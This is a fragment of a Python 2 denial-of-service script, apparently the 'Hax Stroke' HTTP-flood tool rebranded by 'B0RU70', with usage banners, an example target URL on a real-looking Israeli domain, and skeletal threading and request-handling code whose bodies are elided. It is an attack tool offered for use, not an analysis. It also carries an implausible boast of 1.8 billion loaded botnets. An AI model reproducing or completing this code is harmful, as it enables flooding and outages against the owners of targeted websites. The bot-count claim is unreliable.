# ----------------------------------------------------------------------------------------------
# B0RU70.BLOGSPOT.COM // Börü70.Com
# ----------------------------------------------------------------------------------------------
import urllib2
import sys
import threading
...
def usage():
	print 'B0 Priv8 Hax Stroke iDDoS Tool ( individual Dangerous Denial of Service )'
	print 'Facebook: http://facebook.com/B0RU70'
	print 'New loaded Botnets: 1,798,445,657'
	print 'Usage: B0 (url)'
	print 'Example: b0-ddos.py http://luthi.co.il/'
	print "\a"
print \
"""
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
			print "----->>> B0 attack started Sended <<<-----"
			code=500
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "Starting the B0 shotings in webserver Hyper Massive Revolt DDoS Tool"
		print "Created By Hax Stroke And Updated By B0RU70"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
